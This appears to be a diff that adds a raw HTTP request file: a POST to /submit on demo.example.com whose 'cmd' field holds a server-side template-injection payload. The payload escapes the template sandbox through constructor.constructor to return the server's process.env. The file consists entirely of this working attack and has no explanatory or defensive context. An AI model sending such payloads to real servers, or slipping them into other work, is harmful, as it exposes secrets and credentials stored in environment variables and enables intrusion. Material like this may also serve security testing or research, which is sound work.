@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 90
+Connection: close
+
+cmd={{%0a'a'.toUpperCase()%0a}}{{%0aconstructor.constructor('return%0aprocess.env')()%0a}}
